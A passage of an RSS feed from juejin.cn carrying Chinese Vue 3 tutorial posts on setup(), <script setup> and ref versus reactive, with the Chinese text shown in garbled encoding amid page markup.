    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vite App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/src/main.ts"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3---(2)setup]]></title>    <link>https://juejin.cn/post/7583992239102394420</link>    <guid>https://juejin.cn/post/7583992239102394420</guid>    <pubDate>2025-12-16T03:43:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239102394420" data-draft-id="7583992239102378036" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3---(2)setup"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:43:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯æ— æ¶¯"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3---(2)setup
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯æ— æ¶¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:43:31.000Z" title="Tue Dec 16 2025 03:43:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<h2 data-id="heading-0">æ¦‚è¿°</h2>
<blockquote>
<p>Vue 3 å¼•å…¥äº† <code>setup</code> è¯­æ³•ï¼Œä½¿ Composition API æˆä¸ºæ ¸å¿ƒç‰¹æ€§ä¹‹ä¸€ã€‚å®ƒç›¸æ¯” Options API æä¾›äº†æ›´æ¸…æ™°çš„é€»è¾‘ç»„ç»‡ï¼Œæé«˜äº†ä»£ç å¯ç»´æŠ¤æ€§ã€‚ç»„ä»¶ä¸­æ‰€ç”¨åˆ°çš„ï¼šæ•°æ®ã€æ–¹æ³•ã€è®¡ç®—å±æ€§ã€ç›‘è§†......ç­‰ç­‰ï¼Œå‡é…ç½®åœ¨<code>setup</code>ä¸­ã€‚</p>
</blockquote>
<h2 data-id="heading-1">åŸºæœ¬è¯­æ³•Â </h2>
<h4 data-id="heading-2"><strong>ä¼ ç»Ÿ <code>setup</code></strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-attr">name</span>:<span class="hljs-string">'Test'</span>,
    <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>){
      <span class="hljs-comment">// æ•°æ®(vue2 å†™åœ¨dataä¸­)</span>
      <span class="hljs-keyword">let</span> name = <span class="hljs-string">'å¼ ä¸‰'</span>
      <span class="hljs-keyword">let</span> age = <span class="hljs-number">18</span>
      <span class="hljs-comment">// æ–¹æ³•(vue2 å†™åœ¨methodä¸­)</span>
      <span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>){
        name = <span class="hljs-string">'zhang-san'</span> <span class="hljs-comment">//æ³¨æ„ï¼šæ­¤æ—¶è¿™ä¹ˆä¿®æ”¹nameé¡µé¢æ˜¯ä¸å˜åŒ–çš„</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name)
      }
      <span class="hljs-comment">// è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡ä¸­çš„å†…å®¹ï¼Œæ¨¡æ¿ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨</span>
      <span class="hljs-keyword">return</span> {name,age,test}
    }
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>æ³¨æ„:setupè¿”å›å€¼å¦‚æœè¿”å›ä¸€ä¸ªå¯¹è±¡,é‚£ä¹ˆå¯¹è±¡çš„å±æ€§æ–¹æ³•éƒ½å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨,ä½†æ˜¯å¦‚æœè¿”å›ä¸€ä¸ªå‡½æ•°,åˆ™å¯ä»¥è‡ªå®šä¹‰æ¸²æŸ“å†…å®¹</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">setup</span>(<span class="hljs-params"/>){
 <span class="hljs-keyword">return</span> <span class="hljs-function">()=&gt;</span><span class="hljs-string">'è‡ªå®šä¹‰æ–‡å­—æ˜¾ç¤º'</span>
}
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h4 data-id="heading-3"><strong><code>&lt;script setup&gt;</code></strong></h4>
<blockquote>
<p>ä¸éœ€è¦ <code>return</code>ï¼Œå˜é‡å’Œæ–¹æ³•ä¼šè‡ªåŠ¨æš´éœ²ç»™ <code>template</code></p>
</blockquote>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">

  <span class="hljs-comment">// æ•°æ®</span>
  <span class="hljs-keyword">let</span> name = <span class="hljs-string">'å¼ ä¸‰'</span>
  <span class="hljs-keyword">let</span> age = <span class="hljs-number">18</span>
  <span class="hljs-comment">// æ–¹æ³•</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>){
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>æ‰©å±•ï¼šä¸Šè¿°ä»£ç ï¼Œè¿˜éœ€è¦ç¼–å†™ä¸€ä¸ªä¸å†™<code>setup</code>çš„<code>script</code>æ ‡ç­¾ï¼Œå»æŒ‡å®šç»„ä»¶åå­—ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©<code>vite</code>ä¸­çš„æ’ä»¶ç®€åŒ–</p>
<ol>
<li><code>npm i vite-plugin-vue-setup-extend -D</code></li>
<li><code>vite.config.ts</code>ä¸­ä½¿ç”¨æ’ä»¶</li>
<li><code>&lt;script setup lang="ts" name="Person"&gt;</code></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">VueSetupName</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-vue-setup-extend'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [ <span class="hljs-title class_">VueSetupName</span> () ]
})
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-4"/>
<h2 data-id="heading-5">æ‰§è¡Œæ—¶æœº</h2>
<ul>
<li><strong>åœ¨ <code>beforeCreate</code> ä¹‹å‰æ‰§è¡Œ</strong></li>
<li><strong>ä¸èƒ½è®¿é—® <code>this</code></strong>ï¼ˆå› ä¸º <code>this</code> è¿˜æœªåˆå§‹åŒ–,thisè¾“å‡ºä¸ºundefinedï¼‰</li>
<li><strong>åªèƒ½åœ¨ <code>&lt;script setup&gt;</code> æˆ– <code>setup()</code> ä¸­ä½¿ç”¨</strong></li>
</ul>
<h2 data-id="heading-6">Â é‡ç‚¹</h2>
<ol>
<li>å¯ä¸vue2ä¸­çš„data,method,computed ç­‰æ··ç”¨,è€Œä¸”åœ¨data,method...ä¸­ä¹Ÿå¯ä»¥è®¿é—®åˆ°setupä¸­çš„å±æ€§å’Œæ–¹æ³•(å› ä¸ºsetupå…ˆæ‰§è¡Œ,æ•°æ®æ–¹æ³•éƒ½æŒ‚è½½åˆ°vmä¸Š,å¯ä»¥é€šè¿‡thisè®¿é—®åˆ°)</li>
<li>setupä¸èƒ½è®¿é—®vue2ä¸­çš„é…ç½®(data,method),åŸå› åœ¨äºsetupå…ˆæ‰§è¡Œ,æ­¤æ—¶thisè¿˜æ˜¯undefined</li>
</ol>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3---(3)ref,reactive,toRefs,toRef]]></title>    <link>https://juejin.cn/post/7583973472323272719</link>    <guid>https://juejin.cn/post/7583973472323272719</guid>    <pubDate>2025-12-16T03:44:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472323272719" data-draft-id="7583971282892505140" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3---(3)ref,reactive,toRefs,toRef"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:44:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯æ— æ¶¯"/> <meta itemprop="url" content="https://juejin.cn/user/3967483738859639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3---(3)ref,reactive,toRefs,toRef
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3967483738859639/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯æ— æ¶¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:44:29.000Z" title="Tue Dec 16 2025 03:44:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<h2 data-id="heading-0">ref</h2>
<ul>
<li>
<p><strong>ä½œç”¨ï¼š</strong> å®šä¹‰å“åº”å¼å˜é‡ã€‚</p>
</li>
<li>
<p><strong>è¯­æ³•ï¼š</strong> <code>let name= ref('æµ‹è¯•')</code>ã€‚</p>
</li>
<li>
<p><strong>è¿”å›å€¼ï¼š</strong> ä¸€ä¸ª<code>RefImpl</code>çš„å®ä¾‹å¯¹è±¡ï¼Œç®€ç§°<code>refå¯¹è±¡</code>æˆ–<code>ref</code>ï¼Œ<code>ref</code>å¯¹è±¡çš„<code>value</code><strong>å±æ€§æ˜¯å“åº”å¼çš„</strong>ã€‚</p>
</li>
<li>
<p><strong>æ³¨æ„ç‚¹ï¼š</strong></p>
<ul>
<li><code>JS</code>ä¸­æ“ä½œæ•°æ®éœ€è¦ï¼š<code>name.value</code>ï¼Œä½†æ¨¡æ¿ä¸­ä¸éœ€è¦<code>.value</code>ï¼Œç›´æ¥ä½¿ç”¨å³å¯ã€‚</li>
<li>å¯¹äº<code>let name = ref('æµ‹è¯•')</code>æ¥è¯´ï¼Œ<code>name</code>ä¸æ˜¯å“åº”å¼çš„ï¼Œ<code>name.value</code>æ˜¯å“åº”å¼çš„ã€‚</li>
<li>å…¶å®<code>ref</code>æ¥æ”¶çš„æ•°æ®å¯ä»¥æ˜¯ï¼š<strong>åŸºæœ¬ç±»å‹</strong>ã€<strong>å¯¹è±¡ç±»å‹</strong>ã€‚</li>
<li>è‹¥<code>ref</code>æ¥æ”¶çš„æ˜¯å¯¹è±¡ç±»å‹ï¼Œå†…éƒ¨å…¶å®ä¹Ÿæ˜¯è°ƒç”¨äº†<code>reactive</code>å‡½æ•°ã€‚</li>
</ul>
</li>
</ul>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å§“åï¼š{{name}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> {ref} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">let</span> name = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'æµ‹è¯•'</span>)

</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-1">Â reactive</h2>
<ul>
<li><strong>ä½œç”¨ï¼š</strong> å®šä¹‰ä¸€ä¸ª<strong>å“åº”å¼å¯¹è±¡</strong>ï¼ˆåŸºæœ¬ç±»å‹ä¸è¦ç”¨å®ƒï¼Œè¦ç”¨<code>ref</code>ï¼Œå¦åˆ™æŠ¥é”™ï¼‰</li>
<li><strong>è¯­æ³•ï¼š</strong> <code>let å“åº”å¼å¯¹è±¡= reactive(æºå¯¹è±¡)</code>ã€‚</li>
<li><strong>è¿”å›å€¼ï¼š</strong> ä¸€ä¸ª<code>Proxy</code>çš„å®ä¾‹å¯¹è±¡ï¼Œç®€ç§°ï¼šå“åº”å¼å¯¹è±¡ã€‚</li>
<li><strong>æ³¨æ„ç‚¹ï¼š</strong> <code>reactive</code>å®šä¹‰çš„å“åº”å¼æ•°æ®æ˜¯â€œæ·±å±‚æ¬¡â€çš„ã€‚</li>
</ul>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å§“åï¼š{{people.name}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>å¹´é¾„ï¼š{{people.age}}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> {reactive} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">let</span> people = <span class="hljs-title function_">reactive</span>({<span class="hljs-attr">name</span>:<span class="hljs-string">'æµ‹è¯•'</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>})

</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-2">Â refå’ŒreactiveåŒºåˆ«</h2>
<h4 data-id="heading-3">å®šä¹‰æ•°æ®ç±»å‹</h4>
<p><strong>ref</strong>:åŸºæœ¬æ•°æ®ç±»å‹(å¦‚ <code>string</code>ã€<code>number</code>ã€<code>boolean</code>),å¯¹è±¡æ•°æ®ç±»å‹(å¦‚ æ•°ç»„,å¯¹è±¡)</p>
<p><strong>reactive</strong>: å¯¹è±¡æ•°æ®ç±»å‹</p>
<h4 data-id="heading-4">ä½¿ç”¨åŒºåˆ«</h4>
<ol>
<li><code>ref</code>åˆ›å»ºçš„å˜é‡å¿…é¡»ä½¿ç”¨<code>.value</code>ï¼ˆå¯ä»¥ä½¿ç”¨<code>volar</code>æ’ä»¶è‡ªåŠ¨æ·»åŠ <code>.value</code>ï¼‰ã€‚</li>
<li><code>reactive</code>é‡æ–°åˆ†é…ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œä¼š<strong>å¤±å»</strong>å“åº”å¼ï¼ˆå¯ä»¥ä½¿ç”¨<code>Object.assign</code>å»æ•´ä½“æ›¿æ¢ï¼‰ã€‚</li>
</ol>
